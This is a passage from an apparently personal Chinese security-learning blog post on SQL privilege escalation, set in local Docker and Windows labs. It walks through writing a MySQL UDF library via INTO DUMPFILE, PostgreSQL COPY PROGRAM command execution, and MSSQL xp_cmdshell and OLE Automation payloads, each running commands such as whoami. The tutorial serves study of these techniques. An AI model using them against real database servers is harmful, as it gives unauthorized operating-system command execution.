+<p>其中<code>7f454c46</code>就是ELF文件头</p>
+<p>为什么要转成十六进制呢？</p>
+<p><code>.so</code>是二进制文件，不能直接粘进MySQL，转成0x十六进制之后，MySQL就可以把它还原成原始二进制字节</p>
+<p>接下来生成写入UDF的SQL命令：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>echo -n "SELECT 0x" > write_udf.sql</span></span>
+<span class="line"><span>cat lib_udf_lab.hex >> write_udf.sql</span></span>
+<span class="line"><span>echo " INTO DUMPFILE '/usr/lib/mysql/plugin/lib_udf_lab.so';" >> write_udf.sql</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 检查SQL开头</span></span>
+<span class="line"><span>head -c 100 write_udf.sql</span></span>
+<span class="line"><span># 检查SQL结尾</span></span>
+<span class="line"><span>tail -c 120 write_udf.sql</span></span>
+<span class="line"><span># 结尾应该是INTO DUMPFILE '/usr/lib/mysql/plugin/lib_udf_lab.so';</span></span></code></pre>
+<p>可以看出<code>write_udf.sql</code>是一行命令，里面保存的是一个完整的SQL语句，而这个语句中间包含了整个<code>.so</code>文件的十六进制内容，他的作用就是将0x后面的十六进制数据转换成二进制数据然后写入<code>/usr/lib/mysql/plugin/lib_udf_lab.so</code>，同时为了避免换行产生的错误我们在写入时使用<code>tr -d '\n'</code>删除换行，让整个<code>.so</code>的十六进制内容连续成一行</p>
+<p>为什么要通过写命令而不是直接上传<code>.so</code>呢？</p>
+<p>在真实场景中，攻击者通常没有操作系统层面的文件上传权限，<code>.so</code>文件储存在本地，不能通过<code>select load_file('/home/kali/lib_udf_lab.so')</code>在MySQL中读取kali系统里的文件。其次就是MySQL协议的连接主要用来发送SQL语句，没有直接上传任意文件到服务器任意目录的正常功能</p>
+<p>最后我们要执行的就是<code>.sql</code>里面的一行命令：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>SELECT 0x7f454c460201010000000000000000000300....... INTO DUMPFILE '/usr/lib/mysql/plugin/lib_udf_lab.so';</span></span></code></pre>
+<p><img loading="lazy" src="/2026/06/18/SQL%E6%8F%90%E6%9D%83/6.png" class=""></p>
+<p>看到<code>Query OK,1 row affected (0.05sec)</code>，就说明写入成功，在本地可以去验证看看是否写入：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>docker exec mysql-udf-real-lab ls -l /usr/lib/mysql/plugin/lib_udf_lab.so</span></span>
+<span class="line"><span># 查看文件是否已经被写进plugin_dir</span></span>
+<span class="line"><span>docker exec mysql-udf-real-lab sh -c "od -An -tx1 -N4 /usr/lib/mysql/plugin/lib_udf_lab.so"</span></span>
+<span class="line"><span># 验证是不是正常的ELF动态库，如果是7f 45 4c 46就说明正常</span></span></code></pre>
+<p><img loading="lazy" src="/2026/06/18/SQL%E6%8F%90%E6%9D%83/7.png" class=""></p>
+<p>接下来我们可以去试试执行注册UDF函数：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_udf_lab.so';</span></span></code></pre>
+<p><img loading="lazy" src="/2026/06/18/SQL%E6%8F%90%E6%9D%83/8.png" class=""></p>
+<p>注册成功之后我们尝试执行：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>select sys_eval('id');</span></span></code></pre>
+<p><img loading="lazy" src="/2026/06/18/SQL%E6%8F%90%E6%9D%83/10.png" class=""></p>
+<p>可以看到成功实现了UDF命令回显，MySQL将返回结果按十六进制显示结果了，解码之后就是</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>uid=999(mysql) gid=999(mysql) groups=999(mysql)</span></span></code></pre>
+<p><img loading="lazy" src="/2026/06/18/SQL%E6%8F%90%E6%9D%83/11.png" class=""></p>
+<p><img loading="lazy" src="/2026/06/18/SQL%E6%8F%90%E6%9D%83/12.png" class=""></p>
+<p>这样我们就成功拿到了shell的执行权限</p>
+<h1 id="postgresql"><a class="anchor" href="#postgresql">#</a> PostgreSQL</h1>
+<h2 id="copy-program"><a class="anchor" href="#copy-program">#</a> COPY PROGRAM</h2>
+<h3 id="本地靶场搭建-2"><a class="anchor" href="#本地靶场搭建-2">#</a> 本地靶场搭建</h3>
+<p>创建目录结构：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>postgres_priv_lab/</span></span>
+<span class="line"><span>├── docker-compose.yml</span></span>
+<span class="line"><span>└── init.sql</span></span></code></pre>
+<p>其中<code>docker-compose.yml</code>内容如下：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>services:</span></span>
+<span class="line"><span>  postgres:</span></span>
+<span class="line"><span>    image: postgres:16</span></span>
+<span class="line"><span>    container_name: pg-priv-lab</span></span>
+<span class="line"><span>    ports:</span></span>
+<span class="line"><span>      - "127.0.0.1:5433:5432"</span></span>
+<span class="line"><span>    environment:</span></span>
+<span class="line"><span>      POSTGRES_PASSWORD: rootpass</span></span>
+<span class="line"><span>      POSTGRES_DB: appdb</span></span>
+<span class="line"><span>    volumes:</span></span>
+<span class="line"><span>      - ./init.sql:/docker-entrypoint-initdb.d/init.sql:ro</span></span></code></pre>
+<p><code>init.sql</code>：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>CREATE TABLE users (</span></span>
+<span class="line"><span>    id SERIAL PRIMARY KEY,</span></span>
+<span class="line"><span>    username TEXT,</span></span>
+<span class="line"><span>    password TEXT</span></span>
+<span class="line"><span>);</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>INSERT INTO users(username, password) VALUES</span></span>
+<span class="line"><span>('admin', 'admin123'),</span></span>
+<span class="line"><span>('guest', 'guest123'),</span></span>
+<span class="line"><span>('flag', 'ZLARYY&#123;local_postgres_lab_only&#125;');</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>CREATE ROLE webapp LOGIN PASSWORD 'webpass';</span></span>
+<span class="line"><span>GRANT CONNECT ON DATABASE appdb TO webapp;</span></span>
+<span class="line"><span>GRANT USAGE ON SCHEMA public TO webapp;</span></span>
+<span class="line"><span>GRANT SELECT, INSERT, UPDATE ON users TO webapp;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>CREATE ROLE misconf LOGIN PASSWORD 'misconfpass';</span></span>
+<span class="line"><span>GRANT CONNECT ON DATABASE appdb TO misconf;</span></span>
+<span class="line"><span>GRANT USAGE ON SCHEMA public TO misconf;</span></span>
+<span class="line"><span>GRANT SELECT, INSERT, UPDATE ON users TO misconf;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>-- 故意错误配置：允许 misconf 执行服务器端程序</span></span>
+<span class="line"><span>GRANT pg_execute_server_program TO misconf;</span></span></code></pre>
+<p>在PostgreSQL的预定义角色中，<code>pg_execute_program</code>允许用户通过<code>COPY</code>等功能以数据库服务器运行用户身份执行服务器端程序</p>
+<p>在<code>postgres_priv_lab</code>下执行：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>docker compose up -d --force-recreate</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 查看容器，应该看到pg_priv_lab</span></span>
+<span class="line"><span>docker ps</span></span></code></pre>
+<p>如果windows上安装了<code>psql</code>，可以执行：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>psql -h 127.0.0.1 -p 5433 -U misconf -d appdb</span></span></code></pre>
+<p>密码：<code>misconfpass</code></p>
+<p>如果没有安装可以用docker里的客户端连接：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>docker exec -it pg-priv-lab psql -U misconf -d appdb</span></span></code></pre>
+<p><img loading="lazy" src="/2026/06/18/SQL%E6%8F%90%E6%9D%83/13.png" class=""></p>
+<h3 id="提权原理"><a class="anchor" href="#提权原理">#</a> 提权原理</h3>
+<p>相较于UDF提权那些严格的前提条件，PostgreSQL数据库的提权只需要用户具有<code>pg_execute_server_program</code>身份就行</p>
+<p>在<code>PostgreSQL</code>中的几个危险的<strong>预定义角色</strong>：</p>
+<p><code>pg_read_server_file</code>：允许读取数据库服务器能访问的文件</p>
+<p><code>pg_write_server_files</code>：允许写入数据库服务器能访问的位置</p>
+<p><code>pg_execute_server_program</code>：允许执行数据库服务器端程序</p>
+<p><code>PostgreSQL</code>的<code>COPY</code>本来是用来导入、导出数据的，普通用法类似：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 把表数据写到服务器文件里</span></span>
+<span class="line"><span>copy users to '/tmp/users.txt';</span></span></code></pre>
+<p>不过它存在一种危险形式：<code>from</code></p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 让PostgreSQL服务器端执行系统命令id，然后把id的标准输出写入cmd_output表</span></span>
+<span class="line"><span>copy cmd_output from program 'id';</span></span></code></pre>
+<p>那么我们可以实现一种执行命令并查看回显的命令串：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 创建一个临时表，这个表只在当前数据库连接会话中存在，退出psql后一般就会消失，不会长期保存在数据库里面，cmd_output是临时表的名字，这个表里面存在一个列名line，数据类型是text，用来存放文本内容</span></span>
+<span class="line"><span>create temp table cmd_output(line text);</span></span>
+<span class="line"><span>copy cmd_output from program 'id';</span></span>
+<span class="line"><span># 查询表cmd_output里面的内容</span></span>
+<span class="line"><span>select * from cmd_output;</span></span></code></pre>
+<p>如果需要执行多条操作系统命令则需要先清空临时表：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>TRUNCATE cmd_output;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 然后继续执行</span></span>
+<span class="line"><span>COPY cmd_output FROM PROGRAM 'whoami';</span></span>
+<span class="line"><span>SELECT * FROM cmd_output;</span></span></code></pre>
+<h3 id="提权流程-2"><a class="anchor" href="#提权流程-2">#</a> 提权流程</h3>
+<p>我们使用接下来的一串命令查询当前权限角色：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>SELECT rolname FROM pg_roles WHERE pg_has_role(current_user, oid, 'member');</span></span></code></pre>
+<p><img loading="lazy" src="/2026/06/18/SQL%E6%8F%90%E6%9D%83/15.png" class=""></p>
+<p>然后我们尝试执行那一串命令串：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>create temp table cmd_output(line text);</span></span>
+<span class="line"><span>copy cmd_output from program 'id';</span></span>
+<span class="line"><span>select * from cmd_output;</span></span></code></pre>
+<p><img loading="lazy" src="/2026/06/18/SQL%E6%8F%90%E6%9D%83/16.png" class=""></p>
+<p>可以看到成功实现了执行操作系统命令并查看返回结果</p>
+<p>除此之外我们也可以试试<code>COPY ... TO ... PROGRAM</code>，它表示的是将表或查询结果作为标准输入给系统命令：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>COPY (SELECT '') TO PROGRAM 'sh -c "whoami > /tmp/copy_to_who.txt 2>&#x26;1"';</span></span></code></pre>
+<p>这条命令就相当于让PostgreSQL执行<code>sh -c &quot;whoami &gt; /tmp/copy_to_who.txt 2&gt;&amp;1&quot;</code></p>
+<p>虽然 <code>COPY TO PROGRAM</code>不会直接把命令输出显示到SQL结果中，但它确实执行了命令并把结果写到了容器里的<code>/tmp/copy_to_id.txt</code>，那么再次搭配上<code>COPY FROM</code>就可以实现查看回显了：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>CREATE TEMP TABLE cmd_output(line text);</span></span>
+<span class="line"><span>COPY cmd_output FROM PROGRAM 'cat /tmp/copy_to_who.txt';</span></span>
+<span class="line"><span>SELECT * FROM cmd_output;</span></span></code></pre>
+<p><img loading="lazy" src="/2026/06/18/SQL%E6%8F%90%E6%9D%83/17.png" class=""></p>
+<h1 id="mssql"><a class="anchor" href="#mssql">#</a> MSSQL</h1>
+<h2 id="xp_cmdshell"><a class="anchor" href="#xp_cmdshell">#</a> xp_cmdshell</h2>
+<p>学习<code>xp_cmdshell</code>需要我们安装<code>SQL Server</code>以及<code>SSMS</code>：</p>
+<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/ssms/install/install">https://learn.microsoft.com/zh-cn/ssms/install/install</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/sql-server/sql-server-downloads">https://www.microsoft.com/en-us/sql-server/sql-server-downloads</a></p>
+<p>安装流程可以参考：[<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2395996">WEB安全]MSSQL/SQL Server 提权手法详解-腾讯云开发者社区-腾讯云</a></p>
+<p>不过ZLARYY在安装的时候没有用序列号呢~</p>
+<h3 id="xp_cmdshell提权原理"><a class="anchor" href="#xp_cmdshell提权原理">#</a> xp_cmdshell提权原理</h3>
+<p><code>xp_cmdshell</code>本质上是一个扩展存储过程：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>exec xp_cmdshell 'id';</span></span></code></pre>
+<p>可以理解为<code>SQL Server</code>收到SQL语句之后调用<code>xp_cmdshell</code>，<code>SQL Server</code>服务端创建操作系统进程执行<code>id / whoami / dir / ls</code>等系统命令之后把命令输出返回到SQL查询结果</p>
+<h3 id="提权过程"><a class="anchor" href="#提权过程">#</a> 提权过程</h3>
+<p>首先我们通过这些命令去查询当前用户：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>select system_user;</span></span>
+<span class="line"><span>select is_srvrolemember('sysadmin');</span></span></code></pre>
+<p><img loading="lazy" src="/2026/06/18/SQL%E6%8F%90%E6%9D%83/22.png" class=""></p>
+<p>根据查询结果可以看到当前用户是<code>sa</code>，并且是<code>sysadmin</code>，那么我们就有权限开启和调用<code>xp_cmdshell</code></p>
+<p>开启<code>xp_cmdshell</code>：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>EXEC sp_configure 'show advanced options', 1;</span></span>
+<span class="line"><span>RECONFIGURE;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>EXEC sp_configure 'xp_cmdshell', 1;</span></span>
+<span class="line"><span>RECONFIGURE;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 查看xp_cmdshell当前状态</span></span>
+<span class="line"><span>exec sp_configure 'xp_cmdshell';</span></span></code></pre>
+<p><img loading="lazy" src="/2026/06/18/SQL%E6%8F%90%E6%9D%83/23.png" class=""></p>
+<p>接下来我们就可以尝试尝试命令执行了，由于我们现在安装的是Windows本机版的SQL Server，<code>xp_cmdshell</code>执行命令时调用的是Windows的命令解释器，不是Linux shell，所以我们只能执行windows终端下的所有命令：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>exec xp_cmdshell 'dir';</span></span></code></pre>
+<p><img loading="lazy" src="/2026/06/18/SQL%E6%8F%90%E6%9D%83/24.png" class=""></p>
+<p>这样我们就实现了<code>sa</code>让<code>SQL Server</code>服务进程执行系统命令</p>
+<p>查看当前<code>xp_cmdshell</code>拿到的是什么权限：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>exec xp_cmdshell 'whoami';</span></span></code></pre>
+<p><img loading="lazy" src="/2026/06/18/SQL%E6%8F%90%E6%9D%83/25.png" class=""></p>
+<p><code>SQL Server</code>服务账户是谁那么<code>xp_cmdshell</code>执行命令时就是谁的系统权限</p>
+<h2 id="ole"><a class="anchor" href="#ole">#</a> OLE</h2>
+<p>OLE提权一般指MSSQL里的<code>OLE Automation Procedures</code>滥用，他不是一种单独的Windows漏洞，而是<code>SQL Server</code>提供的一组系统存储过程，如果被开启且当前SQL用户有足够权限，就可以在SQL里面创建COM对象，通过<code>sp_OAMethod</code>调用COM对象方法，然后<code>WScript.Shell</code>执行Windows命令，间接调用Windows组件完成文件操作、命令执行等行为</p>
+<p><code>SQL Server</code>支持一组<code>OLE Automation</code>系统存储过程，可以在<code>T-SQL</code>批处理中使用<code>OLE Automation</code>对象，默认情况下这个功能是关闭的，需要系统管理员通过<code>sp_configure</code>启用，启用后，<code>sp_OACreate</code>可以创建<code>OLE Automation</code>对象</p>
+<p>常见的COM对象包括：<code>WScript.Shell</code>、<code>Scripting.FileSystemObject</code>、<code>Shell.Application</code></p>
+<p>其中<code>WScript.Shell</code>经常被用来执行系统命令</p>
+<p><code>OLE Automation</code>存储过程包括<code>sp_OACreate</code>、<code>sp_OADestroy</code>、<code>sp_OAGetProperty</code>、<code>sp_OAMethod</code>、<code>sp_OASetProperty</code>、<code>sp_OAStop</code>、<code>sp_OAGetErrorInfo</code>等</p>
+<p>其中<code>sp_OACreate</code>用于创建COM对象，<code>sp_OAMethod</code>用于调用对象方法，<code>sp_OAGetProperty</code>获取对象属性，<code>sp_OADestroy</code>用于销毁对象</p>
+<h3 id="提权过程-2"><a class="anchor" href="#提权过程-2">#</a> 提权过程</h3>
+<p>开启<code>OLE Automation</code>：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span>EXEC sp_configure 'show advanced options', 1;</span></span>
+<span class="line"><span>RECONFIGURE;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>EXEC sp_configure 'Ole Automation Procedures', 1;</span></span>
+<span class="line"><span>RECONFIGURE;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 查看是否成功开启</span></span>
+<span class="line"><span>EXEC sp_configure 'Ole Automation Procedures';</span></span></code></pre>
+<p><img loading="lazy" src="/2026/06/18/SQL%E6%8F%90%E6%9D%83/26.png" class=""></p>
+<p>命令执行whoami：</p>
+<pre class="shiki shiki-themes vitesse-light vitesse-dark" style="background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee" tabindex="0"><code class="language-text"><span class="line"><span># 声明变量 @shell保存WScript.Shell对象的句柄，@exec保存EXEC执行后返回的对象句柄，@output保存命令输出的结果，@hr保存OLE调用的返回状态码，这里的INT不是普通数字用途，而是用来保存OLE对象的引用编号</span></span>
+<span class="line"><span>DECLARE @shell INT;</span></span>
+<span class="line"><span>DECLARE @exec INT;</span></span>
+<span class="line"><span>DECLARE @output NVARCHAR(4000);</span></span>
+<span class="line"><span>DECLARE @hr INT;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 创建WScript.Shell对象，创建成功后把对象句柄保存到@Shell，返回状态码保存到@hr。WScript.Shell是Windows里的脚本Shell对象，可以执行系统命令</span></span>
+<span class="line"><span>EXEC @hr = sp_OACreate 'WScript.Shell', @shell OUT;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 判断对象是否创建失败，创建失败的话@hr!=0</span></span>
+<span class="line"><span>IF @hr &#x3C;> 0</span></span>
+<span class="line"><span>BEGIN</span></span>
+<span class="line"><span>    SELECT 'sp_OACreate failed' AS error, @hr AS hresult;</span></span>
+<span class="line"><span>    RETURN;</span></span>
+<span class="line"><span>END;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 对@Shell代表的WScript.Shell对象调用Exec方法，执行命令cmd /c whoami，执行后返回一个Exec对象保存到@exec，返回状态码保存到@hr，其中cmd /c whoami表示启动Windows cmd.exe执行whoami，执行完后退出</span></span>
+<span class="line"><span>EXEC @hr = sp_OAMethod @shell, 'Exec', @exec OUT, 'cmd /c whoami';</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 判断Exec是否失败，如果Exec失败就输出错误信息并且执行Exec sp_OADestroy @Shell释放前面创建的WScript.Shell对象</span></span>
+<span class="line"><span>IF @hr &#x3C;> 0</span></span>
+<span class="line"><span>BEGIN</span></span>
+<span class="line"><span>    SELECT 'Exec failed' AS error, @hr AS hresult;</span></span>
+<span class="line"><span>    EXEC sp_OADestroy @shell;</span></span>
+<span class="line"><span>    RETURN;</span></span>
+<span class="line"><span>END;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 读取命令的标准输出，保存到@output，StdOut.ReadAll可以理解为读取命令执行后的全部标准输出内容</span></span>
+<span class="line"><span>EXEC @hr = sp_OAMethod @exec, 'StdOut.ReadAll', @output OUT;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 输出结果</span></span>
+<span class="line"><span>SELECT @output AS command_output;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 释放OLE对象，清理资源</span></span>
+<span class="line"><span>EXEC sp_OADestroy @exec;</span></span>
+<span class="line"><span>EXEC sp_OADestroy @shell;</span></span></code></pre>
+<p><img loading="lazy" src="/2026/06/18/SQL%E6%8F%90%E6%9D%83/2.png" class=""></p>
+<p>这一串payload实现了<code>sp_OACreate</code>创建<code>WScript.Shell</code>，<code>SP_OAMethod</code>调用EXEC方法然后执行<code>cmd /c whoami</code>，读取<code>StdOut.ReadAll</code>，最后<code>select</code>输出结果</p>
+</div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于 </span><time title="修改时间：2026-06-18 20:07:29" itemprop="dateModified" datetime="2026-06-18T20:07:29+08:00">2026-06-18</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>ZLARYY<i class="ic i-at"><em>@</em></i>欢迎来到ZLARYY的个人博客，或许里面有什么好玩的东西~</li><li class="link"><strong>本文链接：</strong><a href="https://zlaryy.top/2026/06/18/SQL%E6%8F%90%E6%9D%83/" title="">https://zlaryy.top/2026/06/18/SQL提权/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2026/05/29/%E5%85%B6%E4%BB%96%E7%B3%BB%E7%BB%9F%E5%BA%93%E7%B1%BB%E5%9E%8B%E4%B8%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5/" rel="prev" itemprop="url" data-background-image="&#x2F;assets&#x2F;picture6.webp" title="其他系统库类型下的SQL注入"><span class="type">上一篇</span><h3>其他系统库类型下的SQL注入</h3></a></div><div class="item right"></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%8F%90%E6%9D%83"><span class="toc-number">1.</span> <span class="toc-text"> SQL提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql"><span class="toc-number">2.</span> <span class="toc-text"> MySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#udf%E6%8F%90%E6%9D%83"><span class="toc-number">2.1.</span> <span class="toc-text"> UDF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 本地靶场搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%86%E5%A4%87udf%E5%8A%A8%E6%80%81%E5%BA%93"><span class="toc-number">2.1.2.</span> <span class="toc-text"> 准备UDF动态库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#udf%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.3.</span> <span class="toc-text"> UDF提权原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%B5%81%E7%A8%8B"><span class="toc-number">2.1.4.</span> <span class="toc-text"> 提权流程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#postgresql"><span class="toc-number">3.</span> <span class="toc-text"> PostgreSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#copy-program"><span class="toc-number">3.1.</span> <span class="toc-text"> COPY PROGRAM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA-2"><span class="toc-number">3.1.1.</span> <span class="toc-text"> 本地靶场搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.2.</span> <span class="toc-text"> 提权原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%B5%81%E7%A8%8B-2"><span class="toc-number">3.1.3.</span> <span class="toc-text"> 提权流程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mssql"><span class="toc-number">4.</span> <span class="toc-text"> MSSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#xp_cmdshell"><span class="toc-number">4.1.</span> <span class="toc-text"> xp_cmdshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xp_cmdshell%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86"><span class="toc-number">4.1.1.</span> <span class="toc-text"> xp_cmdshell提权原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B"><span class="toc-number">4.1.2.</span> <span class="toc-text"> 提权过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ole"><span class="toc-number">4.2.</span> <span class="toc-text"> OLE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B-2"><span class="toc-number">4.2.1.</span> <span class="toc-text"> 提权过程</span></a></li></ol></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="ZLARYY" src="/assets/avertar.png"/><p class="name" itemprop="name">ZLARYY</p><div class="description" itemprop="description">Web安全 / CTF / 个人学习笔记</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">15</span><span class="name">文章</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://github.com/ZLARYY123" class="item github" 